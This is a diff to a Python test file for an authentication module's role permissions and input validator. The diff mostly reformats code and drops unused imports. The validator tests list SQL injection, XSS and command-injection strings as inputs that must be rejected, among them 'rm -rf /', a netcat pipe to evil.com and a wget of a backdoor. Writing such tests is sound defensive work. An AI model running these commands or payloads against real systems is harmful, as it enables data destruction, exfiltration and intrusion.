@@ -5,7 +5,6 @@ without requiring complex setup or integration dependencies.
 """
 
 from datetime import datetime, timedelta, timezone
-from unittest.mock import Mock, patch
 
 import pytest
 
@@ -14,14 +13,12 @@ from auth.rbac_enhancements import (
     ABACEffect,
     ABACRule,
     AccessContext,
-    EnhancedRBACManager,
     RequestStatus,
     ResourceContext,
     RoleAssignmentRequest,
 )
 from auth.security_implementation import (
     ROLE_PERMISSIONS,
-    AuthenticationManager,
     Permission,
     SecurityValidator,
     TokenData,
@@ -81,11 +78,7 @@ class TestRolePermissionMatrix:
         admin_only_perms = {Permission.ADMIN_SYSTEM, Permission.DELETE_AGENT}
 
         for perm in admin_only_perms:
-            roles_with_perm = [
-                role
-                for role, perms in ROLE_PERMISSIONS.items()
-                if perm in perms
-            ]
+            roles_with_perm = [role for role, perms in ROLE_PERMISSIONS.items() if perm in perms]
             assert roles_with_perm == [
                 UserRole.ADMIN
             ], f"Permission {perm} should only be granted to admin"
@@ -185,9 +178,7 @@ class TestSecurityValidator:
         # SQL injection attempts
         assert validator.validate_sql_input("'; DROP TABLE users; --") is False
         assert validator.validate_sql_input("1' OR '1'='1") is False
-        assert (
-            validator.validate_sql_input("UNION SELECT * FROM users") is False
-        )
+        assert validator.validate_sql_input("UNION SELECT * FROM users") is False
         assert validator.validate_sql_input("admin'--") is False
 
     def test_xss_detection(self):
@@ -200,19 +191,10 @@ class TestSecurityValidator:
         assert validator.validate_xss_input("Agent Name 123") is True
 
         # XSS attempts
-        assert (
-            validator.validate_xss_input("<script>alert('xss')</script>")
-            is False
-        )
+        assert validator.validate_xss_input("<script>alert('xss')</script>") is False
         assert validator.validate_xss_input("javascript:alert('xss')") is False
-        assert (
-            validator.validate_xss_input("<img src=x onerror=alert('xss')>")
-            is False
-        )
-        assert (
-            validator.validate_xss_input("<iframe src='evil.com'></iframe>")
-            is False
-        )
+        assert validator.validate_xss_input("<img src=x onerror=alert('xss')>") is False
+        assert validator.validate_xss_input("<iframe src='evil.com'></iframe>") is False
 
     def test_command_injection_detection(self):
         """Test command injection detection."""
@@ -224,19 +206,9 @@ class TestSecurityValidator:
         assert validator.validate_command_injection("agent_name") is True
 
         # Command injection attempts
-        assert (
-            validator.validate_command_injection("file.txt; rm -rf /") is False
-        )
-        assert (
-            validator.validate_command_injection("data | nc evil.com 1234")
-            is False
-        )
-        assert (
-            validator.validate_command_injection(
-                "file.txt && wget evil.com/backdoor"
-            )
-            is False
-        )
+        assert validator.validate_command_injection("file.txt; rm -rf /") is False
+        assert validator.validate_command_injection("data | nc evil.com 1234") is False
+        assert validator.validate_command_injection("file.txt && wget evil.com/backdoor") is False
         assert validator.validate_command_injection("$(whoami)") is False
 
     def test_gmn_spec_sanitization(self):
@@ -289,17 +261,11 @@ class TestSecurityValidator:
 
         # Invalid observation with SQL injection in key
         with pytest.raises(ValueError, match="Invalid observation key"):
-            validator.sanitize_observation_data(
-                {"'; DROP TABLE observations; --": "value"}
-            )
+            validator.sanitize_observation_data({"'; DROP TABLE observations; --": "value"})
 
         # Invalid observation with XSS in value
-        with pytest.raises(
-            ValueError, match="Invalid observation value \\(XSS\\)"
-        ):
-            validator.sanitize_observation_data(
-                {"key": "<script>alert('xss')</script>"}
-            )
+        with pytest.raises(ValueError, match="Invalid observation value \\(XSS\\)"):
+            validator.sanitize_observation_data({"key": "<script>alert('xss')</script>"})
 
         # Invalid observation with oversized value
         with pytest.raises(ValueError, match="Observation value too large"):
@@ -319,9 +285,7 @@ class TestABACRule:
             action="view",
             subject_conditions={"role": ["researcher", "admin"]},
             resource_conditions={"department": "research"},
-            environment_conditions={
-                "time_range": {"start": "09:00", "end": "17:00"}
-            },
+            environment_conditions={"time_range": {"start": "09:00", "end": "17:00"}},
             effect=ABACEffect.ALLOW,
             priority=100,
             created_at=datetime.now(timezone.utc),
